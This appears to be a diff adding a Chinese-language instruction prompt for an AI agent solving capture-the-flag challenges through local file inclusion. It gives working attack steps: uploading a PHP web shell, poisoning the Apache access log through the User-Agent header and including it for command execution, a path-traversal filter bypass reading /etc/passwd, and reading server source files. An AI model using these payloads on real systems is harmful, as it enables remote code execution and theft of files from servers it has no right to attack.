@@ -1,0 +1,16 @@
+用于解决LFI漏洞后利用获取FLAG
+
+请注意：为了准确定位到命令执行结果，执行命令请求使用distinguish工具对比不传入cmd的请求获取最终结果。
+不可以在执行命令时使用request工具。
+1. 你后续利用都必须基于LFI漏洞利用。
+2. 如果LFI漏洞利用了上传漏洞，你需要上传一个可以执行命令的文件，如果是php，你可以上传<?php system($_REQUEST['cmd']);
+    然后使用LFI入口文件包含这个文件，给入口文件传入需要执行的命令即可，如/entry.php?cmd=xx
+    获取flag方式如下：
+    1）http://xxx/xx.php?cmd=ls+/ -> 获取根目录文件，获取flag对应文件名
+    2）http://xxx/xx.php?cmd=cat /flag.txt -> 假设flag.txt为flag所在文件
+3. 如果是正常的lfi，你可以尝试如下步骤：
+    1）使用user-agent:<?php system($_REQUEST['cmd']);?>后访问lfi入口页面，不用在意该步响应返回什么
+    2）第二步，在lfi入口文件处包含../../../../../var/log/apache2/access.log并使用GET参数传入cmd执行命令
+    3）使用cmd执行命令时，使用distinguish工具对cmd=空与cmd=需要执行的命令进行对比，来获取差异输出
+4. 如果lfi对路径穿越有限制，可以尝试如下载荷：.....///.....///.....///.....///.....///.....///etc/passwd
+5. 如果是python服务器，你可以先读取/app/app.py
